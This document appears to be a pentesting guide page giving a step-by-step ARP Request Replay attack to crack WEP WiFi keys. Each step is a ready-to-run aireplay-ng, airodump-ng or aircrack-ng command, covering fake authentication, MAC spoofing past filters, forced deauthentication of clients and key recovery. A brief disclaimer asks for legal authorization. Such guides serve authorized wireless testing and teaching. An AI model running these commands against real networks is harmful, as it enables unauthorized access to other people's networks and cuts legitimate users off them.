# ARP Request Replay Attack

## ARP Request Replay Attack

***

The ARP Request Replay attack is a classic technique used to crack WEP authentication in WiFi networks. It involves intercepting and replaying ARP (Address Resolution Protocol) requests to gather Initialization Vectors (IVs) necessary for the WEP key recovery. Here's a comprehensive guide to executing this attack:

\<aside> 🗣️ Please exercise extreme caution and ensure that you have the necessary permissions and legal authorization before attempting any WiFi network attacks. This guide is provided for educational purposes only, and any unauthorized or malicious use of these techniques is strictly prohibited and may have legal consequences.

\</aside>

Be aware that capturing enough IVs for WEP authentication can take considerable time, especially if the target WiFi network is not heavily used. Prepare for a waiting game that may span days.

### **Fake Authentication with Non-Existing MAC Address**

Initiate fake authentication to a WiFi network using a non-existing MAC address while keeping the connection alive

```bash
aireplay-ng --fakeauth 6000 -o 1 -q 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

### **Fake Authentication with Existing MAC Address**

If MAC address filtering is active, perform fake authentication using an existing MAC address:

```bash
aireplay-ng --fakeauth 0 wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

### **Monitor IVs Capture Progress**

Keep an eye on the number of captured IVs by running 'airodump-ng' against the target WiFi network. Monitor the Data column and aim to capture around 100k IVs

```bash
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

### **Initiate ARP Request Replay Attack**

Start the standard ARP request replaying against the target WiFi network:

```bash
aireplay-ng --arpreplay wlan1 -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

### **Deauthenticate Clients**

If necessary, you can deauthenticate clients from the WiFi network to disrupt their connections

```bash
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

### **Crack the WEP Authentication**

Once you've captured a sufficient number of IVs, it's time to crack the WEP authentication. Use 'aircrack-ng' with the following command:

```bash
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF replay_arp*.cap
```
